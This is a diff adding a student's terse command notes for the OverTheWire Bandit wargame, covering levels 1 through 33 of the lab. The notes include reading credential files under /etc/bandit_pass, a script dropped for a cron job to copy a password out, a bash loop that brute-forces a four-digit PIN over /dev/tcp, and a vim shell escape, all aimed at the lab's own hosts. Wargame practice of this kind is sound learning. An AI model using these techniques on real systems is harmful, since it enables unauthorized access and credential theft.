@@ -1,0 +1,211 @@
+Angel Eduardo Clemente Ledezma
+
+1.
+ls
+cat readme.
+
+2.
+ls
+cat ./-
+
+3.
+ls
+cat spaces\ in\ this\ filename
+
+4.
+cd inhere
+ls -a
+cat ./...Hiding-From-You
+
+5.
+cd inhere
+cat ./-file07
+
+6.
+cat ./maybehere07/.file2
+
+7.
+find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
+cat /var/lib/dpkg/info/bandit7.password
+
+8.
+grep "millionth" data.txt
+
+9.
+sort data.txt | uniq -u
+
+10.
+strings data.txt | grep "="
+
+11.
+base64 -d data.txt
+
+12.
+cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+13.
+head data8.bin.gz
+
+14.
+cat /etc/bandit_pass/bandit14
+
+15.
+nc localhost 30000
+
+16.
+openssl s_client -connect localhost:30001
+echo "" | openssl s_client -connect localhost:30001 -quiet
+
+17.
+nmap -p 31000-32000 localhost
+
+echo ""| openssl s_client -connect localhost:31790 -quiet
+
+nano /tmp/bandit17key.priv
+chmod 600 /tmp/bandit17key.priv
+
+
+18.
+diff passwords.old passwords.new
+
+
+19.
+ssh bandit1@bandit.labs.overthewire.org -p 2220 "cat readme"
+
+20.
+./bandit20-do cat /etc/bandit_pass/bandit20
+
+21.
+echo | nc -lvp 4444 &
+
+
+22.
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/
+
+
+23.
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
+cat /tmp/
+
+
+24.
+WORKDIR=$(mktemp -d)
+cd $WORKDIR
+
+cat > bandit24_script.sh << 'EOF'
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
+chmod 666 /tmp/bandit24_password
+EOF
+
+chmod 777 bandit24_script.sh
+
+sleep 120
+
+cat /tmp/bandit24_password
+
+
+
+25.
+nano fast_brute.sh
+#!/bin/bash
+pass24=""
+
+exec 3<>/dev/tcp/localhost/30002
+
+for pin in {0000..9999}; do
+    if (( $pin % 100 == 0 )); then
+        echo -ne "Probando PIN: $pin\r"
+    fi
+
+    echo "$pass24 $pin" >&3
+    
+    read -t 0.5 -u 3 response
+    
+    if [[ "$response" == *"Correct!"* ]]; then
+        echo -e "\n\n¡PIN ENCONTRADO!: $pin"
+        echo "--------------------------------"
+        echo "$response"
+        echo "--------------------------------"
+        # Extraer contraseña
+        echo "Contraseña bandit25:"
+        echo "$response" | grep -o 'bandit25 .*'
+        break
+    fi
+done
+
+exec 3>&-
+
+
+
+
+26.
+:set shell=/bin/bash
+:shell
+
+cat /etc/bandit_pass/bandit26
+
+
+27.
+ls
+
+
+28.
+mkdir /tmp/git27_$(date +%s) && cd $_
+git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo 2>/dev/null
+cd repo
+git log -p | grep "password" -B5
+
+29.
+mkdir /tmp/mygitdir$$
+cd /tmp/mygitdir$$
+git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo &>/dev/null
+cd repo
+git log -p | grep "password" -B5
+
+30.
+mkdir /tmp/git29_$$
+cd /tmp/git29_$$
+git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo
+cd repo
+
+git branch -a  
+git checkout remotes/origin/dev  
+cat README.md 
+
+git log --graph --oneline --all 
+git show HEAD 
+
+git checkout dev
+cat README.md
+
+31.
+mkdir /tmp/git30_$$
+cd /tmp/git30_$$
+git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo
+cd repo
+git tag  
+git show secret 
+git show-ref --tags 
+git fsck --full --unreachable --no-reflog  
+git show secret | grep -o "[a-zA-Z0-9]\{32\}"  
+
+32.
+mkdir /tmp/git31_$$
+cd /tmp/git31_$$
+git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo
+cd repo
+cat README.md
+echo "May I come in?" > key.txt
+git add key.txt -f 
+git commit -m "Adding key file"
+git push origin master
+
+33.
+$0
+cat /etc/bandit_pass/bandit33
